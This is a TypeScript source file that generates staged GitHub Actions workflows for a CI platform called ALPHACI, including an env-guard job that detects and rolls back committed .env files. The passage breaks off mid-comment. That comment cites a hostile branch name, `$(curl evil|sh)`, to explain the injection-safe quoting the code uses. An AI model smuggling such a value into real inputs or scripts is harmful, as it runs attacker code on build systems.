import yaml from 'js-yaml';

import { resolveCentralWorkflowBase } from '#kernel/config/central-workflow';
import { ENV_GUARD_CHECK_CONTEXT } from '#kernel/ports/workflow-generation.port';
import type { WorkflowTemplate } from '../catalog/catalog.service';
import type {
  WorkflowFragmentBranch,
  WorkflowFragmentRegistry,
} from '#kernel/ports/workflow-fragment.port';
import type { ToolchainFragmentResult } from '#kernel/ports/toolchain-fragment.port';
import { PIPELINE_BRANCHES } from '#kernel/config/pipeline-branches';
import { defaultToolchainRegistry } from './toolchains';
import type { GenerateWorkflowDto } from './dto/generate-workflow.dto';

export type WorkflowStage = 'access' | 'quality' | 'package' | 'guard';

export interface StagedWorkflowFile {
  stage: WorkflowStage;
  name: string;
  path: string;
  gated: boolean;
  yaml: string;
}

export interface WorkflowFileMetadata {
  stage: WorkflowStage;
  name: string;
  path: string;
  gated: boolean;
}

export interface StagedWorkflowBundle {
  workflowFiles: StagedWorkflowFile[];
  metadata: WorkflowFileMetadata[];
}

/**
 * `owner/name/.github/workflows` prefix for every generated `uses:`.
 *
 * Named BASE, not REF: this is the repository, while `centralWorkflowRef` on
 * the build context is the git tag. Both were previously called
 * CENTRAL_WORKFLOW_REF, which is how the repository stayed hardcoded through a
 * change whose stated purpose was making the ref configurable.
 */
const CENTRAL_WORKFLOW_BASE = resolveCentralWorkflowBase();

/**
 * Check-run name of the env-guard job. Branch protection on provisioned repos
 * requires this context so a pull request that adds an environment file can
 * never be merged into a protected branch.
 */
export const ENV_GUARD_WORKFLOW_NAME = 'ALPHACI Env Guard';

export const ENV_GUARD_WORKFLOW_PATH =
  '.github/workflows/05-alphaci-env-guard.yml';

/**
 * Git ref (tag/branch) of the central reusable workflows that generated
 * pipelines pin to. The external (sold) deployment uses `v1`; the internal
 * ALPHACI deployment sets CENTRAL_WORKFLOW_REF=internal-v1 so its
 * generated pipelines track a separate, independently-versioned tag and never
 * collide with the customer-facing `v1` line. Per-project overrides still win.
 */
export function resolveDefaultCentralWorkflowRef(
  env: NodeJS.ProcessEnv = process.env,
): string {
  return env['CENTRAL_WORKFLOW_REF']?.trim() || 'v1';
}

const DEFAULT_CENTRAL_WORKFLOW_REF = resolveDefaultCentralWorkflowRef();

const DEFAULT_LOCAL_PLATFORM_BASE_URL = 'http://localhost:4000';
const GITHUB_CALLBACK_PATH = /\/api\/v1\/auth\/github\/callback\/?$/;
const API_V1_PATH = /\/api\/v1\/?$/;

function normalizePlatformBaseUrl(value: string): string {
  return value.trim().replace(/\/+$/, '').replace(API_V1_PATH, '');
}

export function resolvePlatformBaseUrl(
  env: NodeJS.ProcessEnv = process.env,
): string {
  const explicit =
    env['PLATFORM_PUBLIC_URL']?.trim() || env['API_PUBLIC_URL']?.trim();

  if (explicit) {
    return normalizePlatformBaseUrl(explicit);
  }

  const callbackUrl = env['GITHUB_CALLBACK_URL']?.trim();
  if (callbackUrl) {
    return normalizePlatformBaseUrl(
      callbackUrl.replace(GITHUB_CALLBACK_PATH, ''),
    );
  }

  return DEFAULT_LOCAL_PLATFORM_BASE_URL;
}

const PLATFORM_BASE_URL = resolvePlatformBaseUrl();

const ALPHACI_VALIDATE_URL = `${PLATFORM_BASE_URL}/api/v1/ci/validate`;

export const ALPHACI_REPORT_URL = `${PLATFORM_BASE_URL}/api/v1/ci/report`;

/**
 * Branch promotion model enforced by the generated pipelines:
 *
 *   dev  → where work lands. Full quality stage under a relaxed policy: the
 *          baseline coverage threshold, lint warnings are advisory, and the
 *          SonarCloud gate reports without blocking. Builds, so a break is
 *          found here rather than after a promotion.
 *   uat  → the QA tier. Same checks under a stricter governance policy: higher
 *          coverage threshold, lint warnings fail the build, and the
 *          SonarCloud quality gate is blocking.
 *   main → production. A production-readiness gate (GitHub `production`
 *          environment — honours required reviewers when configured) must
 *          pass before promotion.
 *
 * Each hop opens a promotion pull request into the next branch, gated on the
 * originating branch, so only one promotion job acts per run.
 *
 * Quality/package stages are `workflow_run`-triggered, which always executes
 * in the default-branch context, so every branch decision below must use the
 * originating branch instead of `github.ref_name` alone.
 */
const BRANCH_EXPR = 'github.event.workflow_run.head_branch || github.ref_name';

const HEAD_SHA_EXPR = '${{ github.event.workflow_run.head_sha || github.sha }}';

/**
 * Job ids the toolchain fragments depend on.
 *
 * Named rather than repeated as literals because a fragment writes
 * `needs: [policyJobId]` and reads `needs.<policyJobId>.outputs.*` without
 * seeing this file. A rename that reached only one of the two would produce a
 * workflow Actions rejects at parse time, which is the good case; the bad case
 * is an `if:` referencing a job that no longer exists, which evaluates empty
 * and skips the job silently.
 */
const VALIDATE_ACCESS_JOB_ID = 'validate-access';
const BRANCH_POLICY_JOB_ID = 'branch-policy';

/**
 * A job `if:` matching any of the given branches.
 *
 * Branch conditions were written out by hand per job, so each one had to be
 * found and edited when the promotion flow changed — and a missed one is not a
 * failure, it is a job that quietly stops running on a branch nobody checked.
 */
function branchIsOneOf(branches: readonly string[]): string {
  const test = branches
    .map((branch) => `(${BRANCH_EXPR}) == '${branch}'`)
    .join(' || ');

  return `\${{ ${test} }}`;
}

/** Extra coverage demanded on uat/main on top of the baseline, capped. */
const STRICT_COVERAGE_BONUS = 10;
const STRICT_COVERAGE_CAP = 95;

export interface StagedWorkflowOptions extends GenerateWorkflowDto {
  /**
   * Distinguishes co-located pipelines in a single repository (microservices
   * shape). When set, every workflow file path and workflow `name:` is
   * suffixed so the backend and frontend chains do not overwrite each other —
   * GitHub Actions resolves `workflow_run` triggers by workflow name, so the
   * names must be unique per slot for the stage chains to stay independent.
   */
  workflowVariant?: 'backend' | 'frontend';
  centralWorkflowRef?: string;
  /**
   * True when the target repository carries the ALPHACI scaffold's tests/
   * directory (all product-created repos since the tests-folder rollout).
   * Enables the tests/unit folder guard and widens the Sonar tests path.
   * Leave unset for existing/BYO repositories whose layout is unknown.
   */
  hasTestsDirectory?: boolean;
}

type DeployBranch = WorkflowFragmentBranch;

/**
 * A deployment target that was configured but produced no job.
 *
 * Both causes are silent by nature — nothing fails, the pipeline is simply
 * smaller than the configuration implies — so they are carried out of the
 * builder rather than dropped, and belong in whatever the promotion decision
 * reads.
 */
interface SkippedDeploymentTarget {
  provider: string;
  slot: string;
  branch: DeployBranch;
  reason: 'no-fragment-registered' | 'duplicate-job-id';
}

interface PackageDeploymentPlan {
  jobs: Record<string, unknown>;
  jobIds: string[];
  promotionNeeds: Record<Exclude<DeployBranch, 'main'>, string[]>;
  skippedTargets: SkippedDeploymentTarget[];
}

interface StagedNames {
  fileSuffix: string;
  accessName: string;
  qualityName: string;
  packageName: string;
}

interface StagedWorkflowContext {
  serviceName: string;
  servicePath: string;
  runtimeVersion: string;
  coverageThreshold: number;
  strictCoverageThreshold: number;
  centralWorkflowRef: string;
  requireProductionApproval: boolean;
  stack: WorkflowTemplate['stack'];
  isBackend: boolean;
  hasTestsDirectory: boolean | undefined;
  names: StagedNames;
}

function resolveStagedNames(
  workflowVariant: StagedWorkflowOptions['workflowVariant'],
): StagedNames {
  const fileSuffix = workflowVariant ? `-${workflowVariant}` : '';
  const nameSuffix = workflowVariant ? ` (${workflowVariant})` : '';
  return {
    fileSuffix,
    accessName: `ALPHACI Access Gate${nameSuffix}`,
    qualityName: `ALPHACI Quality${nameSuffix}`,
    packageName: `ALPHACI Package${nameSuffix}`,
  };
}

function resolveStagedContext(
  template: WorkflowTemplate,
  dto: StagedWorkflowOptions,
): StagedWorkflowContext {
  const coverageThreshold = dto.coverageThreshold ?? 80;
  // Prefer what the catalog declares. The comparison below is the fallback for
  // templates with no catalog entry, and is the reason a stack the list did not
  // name was classified as a frontend by omission rather than rejected — see
  // ADR-0006. It stays only until every template resolves through the catalog.
  const isBackend =
    template.kind !== undefined
      ? template.kind === 'backend'
      : template.stack === 'nestjs' || template.stack === 'nodejs';

  return {
    serviceName: dto.serviceName,
    servicePath: normalizeServicePath(dto.servicePath),
    // The DTO only carries nodeVersion, which means nothing to a stack that
    // does not run on Node. An explicit pin still wins; otherwise the catalog's
    // declared default answers, and only a template with neither falls back to
    // the historical Node major. See ADR-0006.
    runtimeVersion: dto.nodeVersion ?? template.runtimeVersion ?? '24',
    coverageThreshold,
    strictCoverageThreshold: Math.min(
      coverageThreshold + STRICT_COVERAGE_BONUS,
      STRICT_COVERAGE_CAP,
    ),
    centralWorkflowRef: dto.centralWorkflowRef ?? DEFAULT_CENTRAL_WORKFLOW_REF,
    requireProductionApproval:
      dto.enhancements?.includes('strictProductionApproval') ?? false,
    stack: template.stack,
    isBackend,
    hasTestsDirectory: dto.hasTestsDirectory,
    names: resolveStagedNames(dto.workflowVariant),
  };
}

function buildAccessWorkflowFile(
  ctx: StagedWorkflowContext,
): StagedWorkflowFile {
  const { accessName, fileSuffix } = ctx.names;
  return {
    stage: 'access',
    name: accessName,
    path: `.github/workflows/00-alphaci-access${fileSuffix}.yml`,
    gated: true,
    yaml: dumpWorkflow({
      name: accessName,
      on: {
        push: { branches: [...PIPELINE_BRANCHES] },
        pull_request: { branches: [...PIPELINE_BRANCHES] },
        workflow_dispatch: {},
      },
      permissions: { contents: 'read' },
      env: {
        ALPHACI_VALIDATE_URL,
        ALPHACI_REPORT_URL: '${{ secrets.ALPHACI_REPORT_URL }}',
      },
      jobs: {
        'validate-access': validationJob('access'),
        'report-results': reportingJob('access', ['validate-access']),
      },
    }),
  };
}

/**
 * Toolchain key for a template, for the case where the template records no
 * stack at all.
 *
 * Templates loaded through the catalog always carry one, but the type is not
 * the guarantee it looks like: `WorkflowTemplate` is also produced by callers
 * that predate the catalog, and an absent stack there used to fall through
 * `isBackend` to a frontend pipeline — a backend template quietly tested as a
 * web app. ADR-0006 separates the two cases: a stack that is *recorded* and
 * unsupported must fail, while a stack that is *absent* keeps the behaviour it
 * had. So absence resolves through the other declared axis, which reproduces
 * the previous output exactly, and only a named stack reaches the registry's
 * error path.
 */
function resolveToolchainStack(ctx: StagedWorkflowContext): string {
  if (ctx.stack) {
    return ctx.stack;
  }

  return ctx.isBackend ? 'nodejs' : 'react';
}

function resolveToolchain(ctx: StagedWorkflowContext): ToolchainFragmentResult {
  // Throws for a stack no toolchain serves. Emitting a stage without its
  // toolchain jobs would produce a green pipeline that tested nothing, which is
  // the failure mode ADR-0006 exists to close.
  return defaultToolchainRegistry.build(resolveToolchainStack(ctx), {
    serviceName: ctx.serviceName,
    servicePath: ctx.servicePath,
    runtimeVersion: ctx.runtimeVersion,
    centralWorkflowRef: ctx.centralWorkflowRef,
    checkoutRef: HEAD_SHA_EXPR,
    hasTestsDirectory: ctx.hasTestsDirectory,
    buildBranchCondition: branchIsOneOf(PIPELINE_BRANCHES),
    policyJobId: BRANCH_POLICY_JOB_ID,
    accessJobId: VALIDATE_ACCESS_JOB_ID,
  });
}

function buildQualityWorkflowFile(
  ctx: StagedWorkflowContext,
  toolchain: ToolchainFragmentResult,
): StagedWorkflowFile {
  const { qualityName, fileSuffix } = ctx.names;

  return {
    stage: 'quality',
    name: qualityName,
    path: `.github/workflows/10-alphaci-quality${fileSuffix}.yml`,
    gated: true,
    yaml: dumpWorkflow({
      name: qualityName,
      on: {
        workflow_run: {
          workflows: [ctx.names.accessName],
          types: ['completed'],
        },
        workflow_dispatch: {},
      },
      permissions: {
        contents: 'read',
        'security-events': 'write',
      },
      env: {
        ALPHACI_VALIDATE_URL,
        ALPHACI_REPORT_URL: '${{ secrets.ALPHACI_REPORT_URL }}',
      },
      jobs: {
        [VALIDATE_ACCESS_JOB_ID]: {
          if: "${{ github.event_name == 'workflow_dispatch' || github.event.workflow_run.conclusion == 'success' }}",
          ...validationJob('quality'),
        },
        [BRANCH_POLICY_JOB_ID]: branchPolicyJob(
          ctx.coverageThreshold,
          ctx.strictCoverageThreshold,
        ),
        // Test, lint, typecheck and security are the toolchain's to define:
        // every one of them names a language runtime. Sonar below is not, and
        // stays here so one job serves every stack.
        ...toolchain.qualityJobs,
        sonar: {
          needs: [BRANCH_POLICY_JOB_ID, toolchain.testJobId],
          // Runs only when the ALPHACI-provisioned SonarCloud secrets are
          // present so repos without Sonar keep passing. The quality gate
          // is advisory for PR source refs and blocking on direct uat/main
          // runs (branch-policy decides via sonar-gate-wait).
          if: "${{ needs.branch-policy.outputs.sonar-enabled == 'true' }}",
          uses: `${CENTRAL_WORKFLOW_BASE}/sonarcloud-scan.yml@${ctx.centralWorkflowRef}`,
          with: {
            'working-directory': ctx.servicePath,
            'system-name': ctx.serviceName,
            'sources-path': 'src',
            'tests-path': ctx.hasTestsDirectory ? 'src,tests' : 'src',
            'coverage-report-path': 'coverage/lcov.info',
            'coverage-artifact-name': `${ctx.serviceName}-coverage`,
            'quality-gate-wait':
              '${{ fromJson(needs.branch-policy.outputs.sonar-gate-wait) }}',
            'checkout-ref': HEAD_SHA_EXPR,
          },
          secrets: {
            SONAR_TOKEN: '${{ secrets.SONAR_TOKEN }}',
            SONAR_PROJECT_KEY: '${{ secrets.SONAR_PROJECT_KEY }}',
            SONAR_ORGANIZATION: '${{ secrets.SONAR_ORGANIZATION }}',
          },
        },
        'report-results': reportingJob(
          'quality',
          [
            VALIDATE_ACCESS_JOB_ID,
            BRANCH_POLICY_JOB_ID,
            ...toolchain.qualityJobIds,
            'sonar',
          ],
          { testJobId: toolchain.testJobId },
        ),
      },
    }),
  };
}

function buildPackageWorkflowFile(
  ctx: StagedWorkflowContext,
  deploymentPlan: PackageDeploymentPlan,
  toolchain: ToolchainFragmentResult,
): StagedWorkflowFile {
  const { packageName, qualityName, fileSuffix } = ctx.names;
  return {
    stage: 'package',
    name: packageName,
    path: `.github/workflows/20-alphaci-package${fileSuffix}.yml`,
    gated: true,
    yaml: dumpWorkflow({
      name: packageName,
      on: {
        workflow_run: {
          workflows: [qualityName],
          types: ['completed'],
        },
        workflow_dispatch: {},
      },
      permissions: {
        contents: 'read',
        packages: 'write',
      },
      env: {
        ALPHACI_VALIDATE_URL,
        ALPHACI_REPORT_URL: '${{ secrets.ALPHACI_REPORT_URL }}',
      },
      jobs: {
        'validate-access': {
          if: "${{ github.event_name == 'workflow_dispatch' || github.event.workflow_run.conclusion == 'success' }}",
          ...validationJob('package'),
        },
        build: toolchain.packageBuildJob,
        'production-gate': productionGateJob(
          ctx.serviceName,
          ctx.isBackend,
          ctx.requireProductionApproval,
          ctx.centralWorkflowRef,
        ),
        ...deploymentPlan.jobs,
        // One promotion job per hop in the flow. Each is branch-gated, so only
        // the one matching the running branch opens a PR: dev opens dev -> uat,
        // uat opens uat -> main.
        'promote-to-uat': promotionJob(
          'dev-to-uat',
          'dev',
          ctx.serviceName,
          ctx.centralWorkflowRef,
          deploymentPlan.promotionNeeds.dev,
        ),
        'promote-to-main': promotionJob(
          'uat-to-main',
          'uat',
          ctx.serviceName,
          ctx.centralWorkflowRef,
          deploymentPlan.promotionNeeds.uat,
        ),
        'report-results': reportingJob('package', [
          'validate-access',
          'build',
          ...deploymentPlan.jobIds,
        ]),
      },
    }),
  };
}

export function buildStagedWorkflowBundle(
  template: WorkflowTemplate,
  dto: StagedWorkflowOptions,
  workflowFragmentRegistry?: WorkflowFragmentRegistry,
): StagedWorkflowBundle {
  const ctx = resolveStagedContext(template, dto);
  const toolchain = resolveToolchain(ctx);
  const deploymentPlan = buildPackageDeploymentPlan(
    dto.deploymentTargets ?? [],
    ctx.serviceName,
    ctx.servicePath,
    ctx.centralWorkflowRef,
    workflowFragmentRegistry,
  );

  const files: StagedWorkflowFile[] = [
    buildAccessWorkflowFile(ctx),
    buildQualityWorkflowFile(ctx, toolchain),
    buildPackageWorkflowFile(ctx, deploymentPlan, toolchain),
  ];

  // The env guard is repo-wide, not per-pipeline: in microservices repos both
  // the backend and frontend chains are generated into the same repository, so
  // it is emitted with the backend (or unsuffixed) bundle only — two copies
  // would race each other pushing rollback commits.
  if (dto.workflowVariant !== 'frontend') {
    files.push(buildEnvGuardWorkflowFile());
  }

  return {
    workflowFiles: files,
    metadata: files.map((file) => ({
      stage: file.stage,
      name: file.name,
      path: file.path,
      gated: file.gated,
    })),
  };
}

/**
 * Standalone secret-protection workflow seeded into every provisioned repo.
 *
 * Unlike the staged access/quality/package chain (which only watches
 * uat/main and authenticates against the platform), the env guard watches the
 * same protected branches and pull requests targeting them. It needs no
 * platform secrets and is fully self-contained:
 *
 *   1. Detect — scans the tracked tree for dotenv-style files (`.env`,
 *      `.env.local`, `backend/.env.production`, …) while allowing the
 *      committable placeholders `.env.example` / `.env.sample` /
 *      `.env.template` that the scaffold ships.
 *   2. Roll back — on push events it removes the offending file(s) in an
 *      automated follow-up commit (`[skip ci]` so the rollback does not
 *      re-trigger the full pipeline chain). If branch protection rejects the
 *      push, it degrades to a warning.
 *   3. Warn — opens (or comments on) a repo issue telling the committer the
 *      values remain in git history and every exposed secret must be rotated.
 *   4. Fail — the check itself fails on the offending commit, and because
 *      branch protection requires the `env-guard` context, a PR containing an
 *      environment file cannot be merged into uat/main.
 *
 * The rollback commit triggers one more guard run which finds a clean tree and
 * passes, so the loop always terminates. On fork pull requests the token is
 * read-only; the write steps are gated to `push` events so the guard still
 * detects and fails without attempting writes.
 */
export function buildEnvGuardWorkflowFile(): StagedWorkflowFile {
  const detectScript = [
    "MATCHES=$(git ls-files | grep -E '(^|/)\\.env(\\.[^/]*)?$' | grep -Ev '(^|/)\\.env\\.(example|sample|template)$' || true)",
    'if [ -z "$MATCHES" ]; then',
    '  echo "found=false" >> "$GITHUB_OUTPUT"',
    '  echo "No environment files are tracked on this ref."',
    'else',
    '  {',
    '    echo "found=true"',
    "    echo 'files<<ALPHACI_ENV_GUARD_EOF'",
    '    printf \'%s\\n\' "$MATCHES"',
    "    echo 'ALPHACI_ENV_GUARD_EOF'",
    '  } >> "$GITHUB_OUTPUT"',
    '  printf \'%s\\n\' "$MATCHES" | while IFS= read -r file; do',
    '    echo "::warning file=$file::Environment file is committed to the repository: $file"',
    '  done',
    'fi',
  ].join('\n');

  const rollbackScript = [
    'git config user.name "alphaci-env-guard"',
    'git config user.email "env-guard@alphaci.invalid"',
    'printf \'%s\\n\' "$MATCHED_FILES" | while IFS= read -r file; do',
    '  [ -n "$file" ] && git rm --quiet --ignore-unmatch -- "$file"',
    'done',
    'if git diff --cached --quiet; then',
    '  echo "No tracked environment files left to remove."',
    '  exit 0',
    'fi',
    'git commit --quiet -m "chore(env-guard): remove committed environment file(s) [skip ci]" -m "Automated rollback by ALPHACI Env Guard. The removed values remain in git history - rotate any exposed secrets."',
    'if git push origin "HEAD:$GUARD_BRANCH"; then',
    '  echo "Environment file(s) removed from $GUARD_BRANCH."',
    'else',
    '  echo "::warning::Rollback push was rejected (branch protection may forbid direct pushes). Remove the file(s) from the branch manually."',
    'fi',
  ].join('\n');

  const issueScript = [
    'TITLE="Security: environment file committed - rotate exposed secrets"',
    'BODY=$(printf \'ALPHACI Env Guard detected environment file(s) pushed to `%s` (commit %s):\\n\\n```\\n%s\\n```\\n\\nThe guard removed the file(s) in an automated follow-up commit where the branch allowed it, but the contents remain in git history.\\n\\n**Action required**\\n1. Rotate every credential the file(s) contained.\\n2. Keep runtime secrets in your deployment provider or GitHub Actions secrets, never in the repository.\\n3. Commit only `.env.example` placeholders.\' "$GUARD_BRANCH" "$GUARD_SHA" "$MATCHED_FILES")',
    'EXISTING=$(gh issue list --repo "$GITHUB_REPOSITORY" --state open --search "$TITLE in:title" --json number --jq \'.[0].number // empty\' || true)',
    'if [ -n "$EXISTING" ]; then',
    '  gh issue comment "$EXISTING" --repo "$GITHUB_REPOSITORY" --body "$BODY" || echo "::warning::Could not comment on the existing env-guard issue"',
    'else',
    '  gh issue create --repo "$GITHUB_REPOSITORY" --title "$TITLE" --body "$BODY" || echo "::warning::Could not open the env-guard warning issue"',
    'fi',
  ].join('\n');

  const failScript = [
    "echo \"::error::Environment files must never be committed. Detected: $(printf '%s' \"$MATCHED_FILES\" | tr '\\n' ' ')\"",
    'exit 1',
  ].join('\n');

  const foundEnvFiles = "steps.detect.outputs.found == 'true'";
  const isPushEvent = "github.event_name == 'push'";

  return {
    stage: 'guard',
    name: ENV_GUARD_WORKFLOW_NAME,
    path: ENV_GUARD_WORKFLOW_PATH,
    gated: false,
    yaml: dumpWorkflow({
      name: ENV_GUARD_WORKFLOW_NAME,
      on: {
        push: { branches: [...PIPELINE_BRANCHES] },
        pull_request: { branches: [...PIPELINE_BRANCHES] },
      },
      permissions: {
        contents: 'write',
        issues: 'write',
      },
      // Serialize runs per ref so two rapid pushes cannot race each other
      // with conflicting rollback commits.
      concurrency: {
        group: 'alphaci-env-guard-${{ github.ref }}',
        'cancel-in-progress': false,
      },
      jobs: {
        [ENV_GUARD_CHECK_CONTEXT]: {
          runs_on: 'ubuntu-latest',
          steps: [
            { uses: 'actions/checkout@v6' },
            {
              name: 'Detect committed environment files',
              id: 'detect',
              run: detectScript,
            },
            {
              name: 'Roll back committed environment files',
              if: `\${{ ${foundEnvFiles} && ${isPushEvent} }}`,
              env: {
                MATCHED_FILES: '${{ steps.detect.outputs.files }}',
                GUARD_BRANCH: '${{ github.ref_name }}',
              },
              run: rollbackScript,
            },
            {
              name: 'Warn the committer',
              if: `\${{ ${foundEnvFiles} && ${isPushEvent} }}`,
              env: {
                GH_TOKEN: '${{ github.token }}',
                MATCHED_FILES: '${{ steps.detect.outputs.files }}',
                GUARD_BRANCH: '${{ github.ref_name }}',
                GUARD_SHA: '${{ github.sha }}',
              },
              run: issueScript,
            },
            {
              name: 'Fail when environment files were committed',
              if: `\${{ ${foundEnvFiles} }}`,
              env: {
                MATCHED_FILES: '${{ steps.detect.outputs.files }}',
              },
              run: failScript,
            },
          ],
        },
      },
    }),
  };
}

/**
 * Normalize a user-supplied service path for use as a workflow
 * working-directory: trims trailing slashes (the FE sends "backend/") and
 * falls back to the repository root.
 */
function normalizeServicePath(servicePath: string | undefined): string {
  const trimmed = (servicePath ?? '.').trim().replace(/\/+$/, '');
  return trimmed === '' ? '.' : trimmed;
}

function validationJob(stage: WorkflowStage) {
  return {
    runs_on: 'ubuntu-latest',
    steps: [
      {
        name: 'Validate ALPHACI access',
        run: [
          'RESPONSE=$(curl -sf -w "\\n%{http_code}" \\',
          '  -X POST \\',
          '  -H "Authorization: Bearer ${{ secrets.ALPHACI_TOKEN }}" \\',
          '  -H "Content-Type: application/json" \\',
          '  -d "{\\"repo\\":\\"${{ github.repository }}\\",\\"stage\\":\\"' +
            stage +
            '\\",\\"workflowRunId\\":\\"${{ github.run_id }}\\",\\"headSha\\":\\"${{ github.event.workflow_run.head_sha || github.sha }}\\"}" \\',
          '  "$ALPHACI_VALIDATE_URL") || true',
          'HTTP_CODE=$(printf \'%s\' "$RESPONSE" | tail -1)',
          'BODY=$(printf \'%s\' "$RESPONSE" | head -n -1)',
          'if [ "$HTTP_CODE" != "200" ]; then',
          '  echo "::error::ALPHACI authorization failed (HTTP $HTTP_CODE). ${BODY}"',
          '  exit 1',
          'fi',
          'echo "ALPHACI authorization validated."',
        ].join('\n'),
      },
    ],
  };
}

/**
 * Resolves the per-branch governance policy once so every downstream job
 * consumes the same decision. Pull-request source refs get the baseline;
 * direct `uat` and `main` runs get the strict profile. Sonar participation is
 * detected from secret presence (job-level `if` cannot read secrets context).
 */
function branchPolicyJob(baseCoverage: number, strictCoverage: number) {
  return {
    needs: ['validate-access'],
    runs_on: 'ubuntu-latest',
    outputs: {
      branch: '${{ steps.resolve.outputs.branch }}',
      'coverage-threshold': '${{ steps.resolve.outputs.coverage-threshold }}',
      'fail-on-warning': '${{ steps.resolve.outputs.fail-on-warning }}',
      'sonar-enabled': '${{ steps.resolve.outputs.sonar-enabled }}',
      'sonar-gate-wait': '${{ steps.resolve.outputs.sonar-gate-wait }}',
    },
    steps: [
      {
        name: 'Resolve branch policy',
        id: 'resolve',
        env: {
          SONAR_CONFIGURED:
            "${{ secrets.SONAR_TOKEN != '' && secrets.SONAR_ORGANIZATION != '' && secrets.SONAR_PROJECT_KEY != '' }}",
        },
        run: [
          `BRANCH="\${{ ${BRANCH_EXPR} }}"`,
          'if [ "$BRANCH" = "uat" ] || [ "$BRANCH" = "main" ]; then',
          `  COVERAGE_THRESHOLD=${strictCoverage}`,
          '  FAIL_ON_WARNING=true',
          '  SONAR_GATE_WAIT=true',
          'else',
          `  COVERAGE_THRESHOLD=${baseCoverage}`,
          '  FAIL_ON_WARNING=false',
          '  SONAR_GATE_WAIT=false',
          'fi',
          '{',
          '  echo "branch=$BRANCH"',
          '  echo "coverage-threshold=$COVERAGE_THRESHOLD"',
          '  echo "fail-on-warning=$FAIL_ON_WARNING"',
          '  echo "sonar-enabled=$SONAR_CONFIGURED"',
          '  echo "sonar-gate-wait=$SONAR_GATE_WAIT"',
          '} >> "$GITHUB_OUTPUT"',
          'echo "Branch policy: branch=$BRANCH coverage>=$COVERAGE_THRESHOLD failOnWarning=$FAIL_ON_WARNING sonar=$SONAR_CONFIGURED gateWait=$SONAR_GATE_WAIT"',
        ].join('\n'),
      },
    ],
  };
}

function buildPackageDeploymentPlan(
  deploymentTargets: NonNullable<GenerateWorkflowDto['deploymentTargets']>,
  serviceName: string,
  servicePath: string,
  centralWorkflowRef: string,
  workflowFragmentRegistry: WorkflowFragmentRegistry | undefined,
): PackageDeploymentPlan {
  const jobs: Record<string, unknown> = {};
  const jobIds: string[] = [];
  const promotionNeeds: Record<
    Exclude<DeployBranch, 'main'>,
    string[]
  > = Object.fromEntries(
    PIPELINE_BRANCHES.filter((branch) => branch !== 'main').map((branch) => [
      branch,
      [] as string[],
    ]),
  ) as Record<Exclude<DeployBranch, 'main'>, string[]>;
  const skippedTargets: SkippedDeploymentTarget[] = [];

  if (deploymentTargets.length > 0 && !workflowFragmentRegistry) {
    throw new Error(
      'A workflow fragment registry is required when deployment targets are configured',
    );
  }

  for (const target of deploymentTargets) {
    for (const branch of resolveDeploymentBranches(target.branchName)) {
      const fragment = workflowFragmentRegistry!.build(target, branch, {
        serviceName,
        servicePath,
        centralWorkflowRef,
      });
      // A target whose provider has no registered fragment produces no deploy
      // job at all. Left as a bare `continue` this is invisible: the pipeline
      // generates, runs green, and never deploys — and the person deciding
      // whether to promote has nothing telling them a deploy was configured but
      // never emitted. Record it so the caller can surface it.
      if (!fragment) {
        skippedTargets.push({
          provider: target.provider,
          slot: target.slot,
          branch,
          reason: 'no-fragment-registered',
        });
        continue;
      }

      if (fragment.jobIds.some((jobId) => jobs[jobId])) {
        skippedTargets.push({
          provider: target.provider,
          slot: target.slot,
          branch,
          reason: 'duplicate-job-id',
        });
        continue;
      }

      Object.assign(jobs, fragment.jobs);
      jobIds.push(...fragment.jobIds);
      // Every branch except production promotes forward, so its deploy jobs
      // gate the promotion PR out of it.
      if (branch !== 'main') {
        promotionNeeds[branch].push(...fragment.promotionNeeds);
      }
    }
  }

  return { jobs, jobIds, promotionNeeds, skippedTargets };
}

function isPipelineBranch(value: string | undefined): value is DeployBranch {
  return (PIPELINE_BRANCHES as readonly string[]).includes(value ?? '');
}

function resolveDeploymentBranches(
  branchName: string | undefined,
): DeployBranch[] {
  if (isPipelineBranch(branchName)) {
    return [branchName];
  }

  return [...PIPELINE_BRANCHES];
}

/**
 * Production-readiness gate, main branch only. Routes through the GitHub
 * `production` environment so required reviewers (when the customer
 * configures them) block the deploy; the checklist + audit trail run either
 * way.
 */
function productionGateJob(
  serviceName: string,
  isBackend: boolean,
  requireApproval: boolean,
  centralWorkflowRef: string,
) {
  return {
    needs: ['build'],
    if: `\${{ (${BRANCH_EXPR}) == 'main' }}`,
    uses: `${CENTRAL_WORKFLOW_BASE}/production-gate.yml@${centralWorkflowRef}`,
    with: {
      'system-dir': serviceName,
      'app-type': isBackend ? 'api' : 'web',
      'require-approval': requireApproval,
    },
  };
}

/**
 * Auto-promotion PR after a fully green package stage on a promotion source
 * branch: uat → main once everything passed on uat. The package stage only
 * starts after the quality stage concluded successfully, so a created PR
 * implies tests, lint, security, and Sonar all passed under the uat policy.
 *
 * `promotion.yml` updates the existing open PR instead of stacking
 * duplicates, and skips when the source branch has no commits ahead of the
 * target. Uses GH_PR_TOKEN (a PAT) when provisioned so the PR triggers the
 * access-gate `pull_request` checks; falls back to github.token, which still
 * creates the PR but GitHub suppresses workflow triggers for it.
 */
function promotionJob(
  direction: 'dev-to-uat' | 'uat-to-main',
  sourceBranch: Exclude<DeployBranch, 'main'>,
  serviceName: string,
  centralWorkflowRef: string,
  additionalNeeds: string[] = [],
) {
  const needs = ['build', ...additionalNeeds];
  const conditions = [
    '!cancelled()',
    `(${BRANCH_EXPR}) == '${sourceBranch}'`,
    "needs.build.result == 'success'",
    ...additionalNeeds.map(
      (need) =>
        `(needs['${need}'].result == 'success' || needs['${need}'].result == 'skipped')`,
    ),
  ];

  return {
    permissions: {
      contents: 'read',
      'pull-requests': 'write',
    },
    needs,
    if: `\${{ ${conditions.join(' && ')} }}`,
    uses: `${CENTRAL_WORKFLOW_BASE}/promotion.yml@${centralWorkflowRef}`,
    with: {
      'pipeline-kind': 'single',
      direction,
      'system1-name': serviceName,
      'pipeline-result': 'success',
    },
    secrets: {
      PR_TOKEN:
        "${{ secrets.GH_PR_TOKEN != '' && secrets.GH_PR_TOKEN || github.token }}",
    },
  };
}

/**
 * Best-effort reporting step that POSTs structured pipeline results to the
 * ALPHACI platform after each stage. Runs with `if: always()` so it fires on
 * success, failure, and cancellation. The curl uses `--max-time 5` and falls
 * back to a warning annotation on any error so the pipeline never fails due to
 * a reporting outage.
 *
 * Security: all GitHub context values (`github.repository`, `github.run_id`,
 * branch names, SHAs) are mapped to shell env vars in the step `env:` block
 * and referenced only as double-quoted shell variables inside the `run:` script.
 * JSON is assembled with `jq --arg` / `--argjson` so hostile branch names
 * (e.g. `$(curl evil|sh)`) cannot escape the string boundary.
 *
